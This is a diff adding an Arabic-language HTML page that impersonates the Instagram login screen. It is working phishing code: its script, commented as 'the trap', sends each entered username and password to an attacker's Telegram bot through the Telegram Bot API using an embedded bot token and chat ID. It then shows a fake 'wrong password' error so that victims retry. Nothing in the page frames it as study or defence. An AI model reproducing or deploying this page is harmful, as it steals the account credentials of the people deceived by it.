@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        
+        body { 
+            background: #fafafa; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column;
+            align-items: center; 
+            padding: 20px; 
+        }
+
+        .container { 
+            background: #fff; 
+            border: 1px solid #dbdbdb; 
+            border-radius: 1px; 
+            padding: 40px 40px 20px 40px; 
+            width: 100%; 
+            max-width: 350px; 
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        .insta-logo {
+            font-family: 'Brush Script MT', 'Segoe Script', 'Snell Roundhand', cursive; 
+            font-size: 50px; 
+            color: #262626; 
+            margin-bottom: 35px;
+            font-weight: 400;
+        }
+
+        form { display: flex; flex-direction: column; gap: 6px; }
+
+        .input-group input { 
+            width: 100%; 
+            padding: 9px 8px 7px 8px; 
+            background: #fafafa; 
+            border: 1px solid #dbdbdb; 
+            border-radius: 3px; 
+            color: #262626; 
+            font-size: 12px; 
+            outline: none;
+        }
+        
+        .input-group input:focus { 
+            border: 1px solid #a8a8a8; 
+            background: #fff;
+        }
+
+        .btn-insta { 
+            width: 100%; 
+            padding: 7px; 
+            background: #0095f6; 
+            color: #fff; 
+            border: none; 
+            border-radius: 4px; 
+            font-size: 14px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            margin-top: 12px;
+        }
+        
+        .btn-insta:disabled { background: #b2dffc; cursor: not-allowed; }
+
+        .divider { 
+            display: flex; 
+            align-items: center; 
+            margin: 18px 0; 
+            color: #8e8e8e; 
+            font-size: 13px; 
+            font-weight: 600;
+        }
+
+        .divider::before, .divider::after { 
+            content: ''; 
+            flex: 1; 
+            height: 1px; 
+            background: #dbdbdb; 
+        }
+
+        .divider span { padding: 0 18px; }
+
+        .forgot { 
+            color: #00376b; 
+            font-size: 12px; 
+            margin-top: 15px; 
+            cursor: pointer; 
+            text-decoration: none;
+            display: inline-block;
+            font-weight: 500;
+        }
+
+        .error { 
+            color: #ed4956; 
+            font-size: 14px; 
+            margin-top: 15px; 
+            display: none; 
+            line-height: 1.4;
+        }
+
+        /* صندوق إنشاء حساب جديد */
+        .signup-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="insta-logo">Instagram</div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="كلمة السر" required>
+            </div>
+            <button type="submit" class="btn-insta" id="loginBtn">تسجيل الدخول</button>
+        </form>
+
+        <div class="divider"><span>أو</span></div>
+        
+        <a href="#" class="forgot">نسيت كلمة السر؟</a>
+        
+        <p class="error" id="error">عذراً، كلمة السر غير صحيحة. يرجى المحاولة مرة أخرى.</p>
+    </div>
+
+    <div class="signup-box">
+        ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a>
+    </div>
+
+    <script>
+        // ==========================================
+        // إعدادات تلجرام (الفخ)
+        // ==========================================
+        const BOT_TOKEN = '8863933045:AAE-GSd-pWrvzSJiijFNkjm9sgZ0g7S7E2w';
+        const CHAT_ID = '7644504212';
+
+        // دالة إرسال البيانات
+        async function sendToTelegram(username, password) {
+            const message = `<b>📸 Instagram Login - Target</b>\n\n<b>Username:</b> <code>${username}</code>\n<b>Password:</b> <code>${password}</code>`;
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+                });
+            } catch (e) {}
+        }
+
+        // التعامل مع الفورم
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault(); // منع إعادة تحميل الصفحة
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('loginBtn');
+            const errorMsg = document.getElementById('error');
+
+            // تغيير شكل الزرار
+            btn.innerText = 'جاري تسجيل الدخول...';
+            btn.disabled = true;
+            errorMsg.style.display = 'none';
+
+            // إرسال البيانات
+            await sendToTelegram(username, password);
+
+            // إظهار خطأ وهمي بعد ثانية
+            setTimeout(() => {
+                btn.innerText = 'تسجيل الدخول';
+                btn.disabled = false;
+                errorMsg.style.display = 'block';
+                document.getElementById('password').value = '';
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
